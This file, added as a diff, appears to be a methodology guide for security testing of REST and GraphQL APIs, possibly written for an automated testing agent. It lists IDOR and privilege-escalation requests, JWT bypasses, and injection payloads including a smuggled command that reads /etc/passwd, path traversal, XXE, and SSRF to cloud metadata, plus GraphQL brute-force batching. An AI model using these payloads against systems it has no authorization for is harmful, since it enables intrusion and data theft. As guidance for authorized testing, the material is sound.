@@ -1,0 +1,380 @@
+<api_security_testing_guide>
+<title>API SECURITY TESTING - REST & GraphQL</title>
+
+<critical>Modern APIs expose business logic directly and often lack the security controls present in traditional web applications. Test authorization at every endpoint, validate input handling, and verify rate limiting. Broken access control and authentication issues are the most common API vulnerabilities.</critical>
+
+<scope>
+- REST APIs (JSON, XML, form-encoded)
+- GraphQL APIs (queries, mutations, subscriptions)
+- WebSocket APIs
+- gRPC APIs
+- API authentication (OAuth2, JWT, API keys, Basic Auth)
+- API authorization (RBAC, ABAC, resource-level permissions)
+- Rate limiting and abuse prevention
+- API versioning and deprecated endpoints
+</scope>
+
+<methodology>
+1. **Discovery**: Find API endpoints via documentation, OpenAPI specs, traffic inspection
+2. **Authentication**: Test authentication mechanisms for bypasses and weaknesses
+3. **Authorization**: Test access controls with different user roles and privileges
+4. **Input validation**: Test all parameters for injection, overflow, and type confusion
+5. **Business logic**: Test for logic flaws in workflows and state transitions
+6. **Rate limiting**: Test for absence or bypass of rate limiting
+7. **Information disclosure**: Check for excessive data exposure and verbose errors
+</methodology>
+
+<rest_api_testing>
+<endpoint_discovery>
+# Common API patterns
+/api/v1/users
+/api/v2/users
+/api/users
+/v1/users
+/rest/users
+/services/users
+
+# Find OpenAPI/Swagger
+/swagger.json
+/swagger.yaml
+/openapi.json
+/api-docs
+/docs
+/api/swagger
+/api/docs
+
+# Legacy/hidden versions
+/api/v0/users
+/api/beta/users
+/api/internal/users
+/api/admin/users
+
+# HTTP methods to test
+GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+</endpoint_discovery>
+
+<authentication_attacks>
+# JWT vulnerabilities
+- None algorithm: {"alg":"none"}
+- Weak signing key: Brute force HS256 key
+- Algorithm confusion: Change RS256 to HS256
+- Token expiration: Use expired tokens
+- Missing signature validation
+- Hardcoded secrets in client code
+
+# API key issues
+- Keys in URLs (logged in proxies/servers)
+- Keys in client-side code
+- Keys without rate limiting
+- Keys without rotation
+- Shared keys across environments
+
+# OAuth 2.0 issues
+- Missing PKCE in public clients
+- State parameter not validated
+- Redirect URI validation bypass
+- Token leakage in Referer header
+- Refresh token theft
+</authentication_attacks>
+
+<authorization_attacks>
+# IDOR (Insecure Direct Object Reference)
+GET /api/users/123        # Own ID
+GET /api/users/124        # Someone else's ID
+GET /api/users/1          # Admin ID?
+
+# Horizontal privilege escalation
+User A: GET /api/orders/abc123 (their order)
+User A: GET /api/orders/def456 (User B's order) ← Test this
+
+# Vertical privilege escalation
+Regular user: POST /api/users/123/promote (make self admin)
+Regular user: DELETE /api/users/456 (delete other users)
+Regular user: GET /api/admin/stats (access admin endpoint)
+
+# Parameter tampering
+POST /api/orders
+{"user_id": 123, "amount": 100}  # Change user_id to other user
+
+# Mass assignment
+POST /api/users
+{"username": "test", "email": "test@ex.com", "is_admin": true}
+
+# Function level authorization
+User endpoint: GET /api/users/profile
+Admin endpoint: GET /api/admin/users (try as regular user)
+</authorization_attacks>
+
+<input_validation_attacks>
+# SQL injection in parameters
+GET /api/users?id=1' OR '1'='1
+POST /api/search {"query": "test' UNION SELECT password FROM users--"}
+
+# NoSQL injection
+POST /api/login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+# Command injection
+POST /api/ping {"host": "example.com; cat /etc/passwd"}
+
+# Path traversal
+GET /api/files?name=../../../etc/passwd
+GET /api/download?file=....//....//etc/passwd
+
+# XXE (XML APIs)
+POST /api/import
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<user><name>&xxe;</name></user>
+
+# SSRF
+POST /api/webhook {"url": "http://169.254.169.254/latest/meta-data/"}
+POST /api/fetch {"url": "http://localhost:8080/admin"}
+
+# Type confusion
+POST /api/users
+{"age": "25"}     # String instead of integer
+{"age": [25]}     # Array instead of integer
+{"age": {"$gt": 0}} # Object instead of integer
+</input_validation_attacks>
+
+<rate_limiting_attacks>
+# Test for absence
+- Send 1000 requests to login endpoint
+- Check if account lockout occurs
+- Check if rate limit headers present (X-RateLimit-*)
+
+# Rate limit bypass attempts
+- Use different IP addresses (X-Forwarded-For header)
+- Use different user agents
+- Rotate between multiple API keys
+- Use different endpoints for same action
+- Exploit race conditions
+</rate_limiting_attacks>
+
+<information_disclosure>
+# Excessive data exposure
+GET /api/users
+# Returns: all user data including passwords, tokens, internal IDs
+
+# Verbose error messages
+GET /api/users/abc
+# Returns: "Error: User with ID 'abc' not found in table 'users' column 'user_id'"
+
+# API documentation in production
+- Swagger UI exposed
+- OpenAPI spec reveals internal endpoints
+- GraphQL introspection enabled
+
+# Version disclosure
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: Express
+X-AspNet-Version: 4.0.30319
+</information_disclosure>
+</rest_api_testing>
+
+<graphql_testing>
+<introspection_queries>
+# Check if introspection enabled (should be disabled in production)
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+
+# Find mutations
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          type {
+            name
+          }
+        }
+      }
+    }
+  }
+}
+</introspection_queries>
+
+<graphql_attacks>
+# Batching attack (bypass rate limiting)
+[
+  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") }"},
+  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") }"},
+  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") }"},
+  ... # 1000 attempts in single request
+]
+
+# Circular query / DoS
+query {
+  user(id: 1) {
+    posts {
+      author {
+        posts {
+          author {
+            posts {
+              # ... nested infinitely
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Field suggestion disclosure
+query {
+  user(id: 1) {
+    nonExistentField
+  }
+}
+# Error: "Did you mean 'secret_field'?"
+
+# IDOR in GraphQL
+query {
+  user(id: 123) {  # Own user
+    email
+    privateData
+  }
+}
+query {
+  user(id: 124) {  # Other user - test authorization
+    email
+    privateData
+  }
+}
+
+# Mass assignment
+mutation {
+  updateUser(id: 123, input: {
+    name: "Test"
+    isAdmin: true  # Try to escalate privileges
+  })
+}
+</graphql_attacks>
+</graphql_testing>
+
+<business_logic_flaws>
+# Race conditions
+- Purchase item with insufficient balance
+- Use coupon code multiple times simultaneously
+- Withdraw more money than account balance
+
+# Workflow bypasses
+- Skip payment step in checkout flow
+- Complete order without inventory check
+- Access restricted feature before verification
+
+# Price manipulation
+POST /api/cart
+{"product_id": 123, "price": 0.01, "quantity": 100}
+
+# Quantity manipulation
+{"product_id": 123, "quantity": -1}  # Refund attack
+
+# Currency manipulation
+{"amount": 100, "currency": "USD"}
+{"amount": 100, "currency": "VND"}  # Lower value currency
+</business_logic_flaws>
+
+<owasp_api_top_10>
+1. **Broken Object Level Authorization (IDOR)**
+   Test: Access other users' resources by changing ID parameters
+
+2. **Broken User Authentication**
+   Test: JWT weaknesses, missing auth, weak credentials
+
+3. **Broken Object Property Level Authorization**
+   Test: Mass assignment, excessive data exposure
+
+4. **Unrestricted Resource Consumption**
+   Test: No rate limiting, large payloads, nested queries
+
+5. **Broken Function Level Authorization**
+   Test: Regular user accessing admin functions
+
+6. **Unrestricted Access to Sensitive Business Flows**
+   Test: Automated ticket buying, automated voting
+
+7. **Server Side Request Forgery (SSRF)**
+   Test: URL parameters that make backend requests
+
+8. **Security Misconfiguration**
+   Test: Default credentials, unnecessary features, verbose errors
+
+9. **Improper Inventory Management**
+   Test: Outdated API versions, unpatched frameworks
+
+10. **Unsafe Consumption of APIs**
+    Test: Third-party API data validation, SSRF via webhooks
+</owasp_api_top_10>
+
+<testing_tools>
+# Intercepting proxies
+- Burp Suite
+- OWASP ZAP
+- mitmproxy
+
+# API testing tools
+- Postman
+- curl
+- httpie
+- GraphQL Playground
+- Insomnia
+
+# Automated scanners
+- nuclei (with API templates)
+- ffuf (fuzzing)
+- sqlmap (for injection)
+- GraphQL Cop (GraphQL-specific)
+</testing_tools>
+
+<validation_requirements>
+Provide complete proof-of-concept including:
+1. **Endpoint**: Full API endpoint URL and method
+2. **Authentication**: What tokens/credentials were used
+3. **Request**: Complete HTTP request (headers + body)
+4. **Response**: Relevant parts of response showing vulnerability
+5. **User context**: Which user role was used for testing
+6. **Impact**: What unauthorized action was performed or data accessed
+7. **Reproduction**: Step-by-step instructions
+8. **Remediation**: Specific fix (implement authorization check, validate input, etc.)
+</validation_requirements>
+
+<pro_tips>
+1. **Test with multiple roles**: Admin, regular user, guest, different tenants
+2. **Change one parameter at a time**: Methodical testing finds more issues
+3. **Check HTTP methods**: Try PUT/DELETE on GET-only endpoints
+4. **Look for patterns**: Vulnerability in one endpoint often exists in others
+5. **Test deprecated versions**: /api/v1 might lack security fixes in /api/v2
+6. **Check OPTIONS method**: Reveals allowed HTTP methods
+7. **Test content-type switching**: JSON → XML → form-encoded
+8. **Monitor network traffic**: Mobile apps often use hidden API endpoints
+9. **Read API documentation**: Security section often reveals concerns
+10. **Test error handling**: Different error responses leak information
+</pro_tips>
+
+<remember>
+APIs are the backbone of modern applications. Always:
+- Test authorization on EVERY endpoint
+- Verify access controls with different user roles
+- Test for IDOR vulnerabilities systematically
+- Check for excessive data exposure
+- Validate rate limiting exists and works
+- Never cause denial of service in production
+- Document exact reproduction steps with full requests
+</remember>
+</api_security_testing_guide>
